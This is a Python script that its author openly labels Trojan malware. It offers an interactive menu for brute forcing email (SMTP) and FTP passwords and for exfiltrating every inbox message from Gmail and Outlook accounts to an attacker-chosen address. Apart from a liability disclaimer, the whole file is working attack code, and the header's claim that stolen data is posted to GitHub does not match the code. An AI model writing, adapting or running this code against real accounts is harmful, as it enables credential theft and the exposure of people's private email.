#! /usr/bin/python
#################################################################################################
# Author: Nicholas Fisher
# Date: March 6th 2024
# Important Note:
#  I, Nicholas Fisher, the creator of this Trojan malware, am not responsible for the misuse of 
# these scripts. They are malicious and should only be used in professionally approved White Hat 
# scenarios. You are responsible for any consequences resulting from the misuse of this malware,
# including all fines, fees, and repercussions. Please read this statement carefully: by downloading 
# any of the scripts in this repository, you, as the user, take full responsibility for storing, using,
# and testing these malicious scripts and guidelines. You also take full responsibility for any misuse 
# of this malware. Please note that any data the Trojan extracts will be posted to a GitHub repository, 
# and if that repository is public, all the extracted data will be available for the whole world to see.
# Description of Script
# This script is a comprehensive tool that offers a range of functionalities for email-related tasks 
# and FTP brute forcing. It allows users to send test emails, brute force email passwords, and 
# exfiltrate emails from both Gmail and Outlook accounts. Additionally, it enables users to perform 
# FTP brute force attacks using provided username and password dictionaries. The script presents 
# an interactive menu, guiding users through various options to choose the desired action. 
# An example use case could involve a cybersecurity professional testing the security of an 
# organization's email system and FTP server by attempting to brute force passwords and 
# exfiltrate sensitive data.
# Example output:
# Please enter the server URL address here: smtp.example.com
# Please enter the account address here: sender@example.com
# Please input the account password here: ********
# Please enter the target account address here: receiver@example.com
# Choose an option:
# 1. Send a test email
# 2. Brute force an email password
# 3. Exfiltrate emails from a Gmail account
# 4. Exfiltrate emails from an Outlook account (Windows only)
# 5. Brute force FTP server
# 6. Exit
# Option: 1
# Please enter Test Subject Line here: Test Email
# Please enter email content here: This is a test email for demonstration purposes.
# Test email sent successfully.
# Choose an option:
# 1. Send a test email
# 2. Brute force an email password
# 3. Exfiltrate emails from a Gmail account
# 4. Exfiltrate emails from an Outlook account (Windows only)
# 5. Brute force FTP server
# 6. Exit
# Option: 5
# Please enter FTP server address: ftp.example.com
# Please enter the path to the username dictionary: usernames.txt
# Please enter the path to the password dictionary: passwords.txt
# FTP credentials found: Username - admin, Password - secret123
# Choose an option:
# 1. Send a test email
# 2. Brute force an email password
# 3. Exfiltrate emails from a Gmail account
# 4. Exfiltrate emails from an Outlook account (Windows only)
# 5. Brute force FTP server
# 6. Exit
# Option: 6
# Exiting...
#################################################################################################
import smtplib
import imaplib
import time
import win32com.client  # Only for Windows environment
import ftplib
import os

# Function to send plain text email
def plain_email(subject, contents):
    """
    Sends a plain text email.

    Args:
    subject (str): The subject of the email.
    contents (str): The body of the email.
    """
    # Construct the email message
    message = f'Subject: {subject}\nFrom: {smtp_acct}\n'
    message += f'To: {", ".join(tgt_accts)}\n\n{contents}'
    
    # Connect to SMTP server and send the email
    server = smtplib.SMTP(smtp_server, smtp_port)
    server.starttls()
    server.login(smtp_acct, smtp_passwd)
    server.sendmail(smtp_acct, tgt_accts, message)
    
    # Sleep briefly before quitting the server
    time.sleep(1)
    server.quit()

# Function to brute force email account passwords
def brute_force_password(email):
    """
    Brute forces passwords for a given email account.

    Args:
    email (str): The email address to brute force.

    Returns:
    str: The found password, if successful; otherwise, None.
    """
    passwords = ['password1', 'password2', 'password3']  # Add more passwords for brute force
    for password in passwords:
        try:
            server = smtplib.SMTP(smtp_server, smtp_port)
            server.starttls()
            server.login(email, password)
            server.quit()
            return password
        except smtplib.SMTPAuthenticationError:
            continue
    return None

# Function to exfiltrate emails from a Gmail account
def exfiltrate_gmail(email, password):
    """
    Exfiltrates emails from a Gmail account.

    Args:
    email (str): The Gmail address.
    password (str): The password for the Gmail account.
    """
    # Connect to Gmail IMAP server
    imap_server = "imap.gmail.com"
    mail = imaplib.IMAP4_SSL(imap_server)
    mail.login(email, password)
    mail.select('inbox')
    
    # Fetch all email IDs in the inbox
    result, data = mail.search(None, 'ALL')
    email_ids = data[0].split()
    
    # Fetch and send each email
    for email_id in email_ids:
        result, data = mail.fetch(email_id, "(RFC822)")
        raw_email = data[0][1]
        plain_email('Exfiltrated Email', raw_email)
    
    # Close connection
    mail.close()
    mail.logout()

# Function to exfiltrate emails from an Outlook account (Windows only)
def exfiltrate_outlook():
    """
    Exfiltrates emails from an Outlook account (Windows only).
    """
    # Connect to Outlook
    outlook = win32com.client.Dispatch("Outlook.Application")
    namespace = outlook.GetNamespace("MAPI")
    folder = namespace.Folders[1].Folders['Inbox']
    messages = folder.Items
    
    # Fetch and send each email
    for message in messages:
        plain_email('Exfiltrated Outlook Email', message.Body)

# Function to brute force FTP server with given usernames and passwords
def brute_force_ftp(username_dict_path, password_dict_path, ftp_server):
    """
    Brute forces FTP server using provided username and password dictionaries.

    Args:
    username_dict_path (str): Path to the file containing usernames.
    password_dict_path (str): Path to the file containing passwords.
    ftp_server (str): FTP server address.
    """
    with open(username_dict_path) as users_file:
        usernames = users_file.read().splitlines()
    with open(password_dict_path) as passwords_file:
        passwords = passwords_file.read().splitlines()

    for username in usernames:
        for password in passwords:
            try:
                ftp = ftplib.FTP(ftp_server)
                ftp.login(username, password)
                ftp.quit()
                return username, password
            except ftplib.error_perm:
                continue
    return None, None

# Interactive menu function
def menu():
    # Display menu options
    print("Choose an option:")
    print("1. Send a test email")
    print("2. Brute force an email password")
    print("3. Exfiltrate emails from a Gmail account")
    print("4. Exfiltrate emails from an Outlook account (Windows only)")
    print("5. Brute force FTP server")
    print("6. Exit")

if __name__ == '__main__':
    # User inputs for email server details
    smtp_input = input("Please enter the server URL address here: ")
    smtp_server = smtp_input
    smtp_port = 587
    acct_input = input("Please enter the account address here: ")
    smtp_acct = acct_input
    passwd_input = input("Please input the account password here: ")
    smtp_passwd = passwd_input
    trgt_addr_input = input("Please enter the target account address here: ")
    tgt_accts = [trgt_addr_input]

    # Interactive menu loop
    while True:
        menu()  # Display menu
        option = input("Option: ")  # Prompt user for option

        if option == '1':  # Option to send a test email
            sub_input = input("Please enter Test Subject Line here: ")
            content_input = input("Please enter email content here: ")
            plain_email(f'{sub_input}', f'{content_input}')
        elif option == '2':  # Option to brute force an email password
            brute_force_email = input("Please enter the email address to brute force: ")
            brute_force_result = brute_force_password(brute_force_email)
            if brute_force_result:
                print(f"Password found: {brute_force_result}")
            else:
                print("Password not found.")
        elif option == '3':  # Option to exfiltrate emails from a Gmail account
            gmail_exfil_email = input("Please enter the Gmail address to exfiltrate emails from: ")
            gmail_password = input("Please enter the password for the Gmail account: ")
            exfiltrate_gmail(gmail_exfil_email, gmail_password)
        elif option == '4':  # Option to exfiltrate emails from an Outlook account (Windows only)
            exfiltrate_outlook()
        elif option == '5':  # Option to brute force FTP server
            ftp_server = input("Please enter FTP server address: ")
              # Prompt for the path to username and password dictionaries
            username_dict_path = input("Please enter the path to the username dictionary: ")
            password_dict_path = input("Please enter the path to the password dictionary: ")

            # Perform FTP brute force
            username, password = brute_force_ftp(username_dict_path, password_dict_path, ftp_server)
            if username and password:
                print(f"FTP credentials found: Username - {username}, Password - {password}")
            else:
                print("FTP credentials not found.")
        elif option == '6':  # Option to exit the script
            print("Exiting...")
            break
        else:
            print("Invalid option. Please try again.")



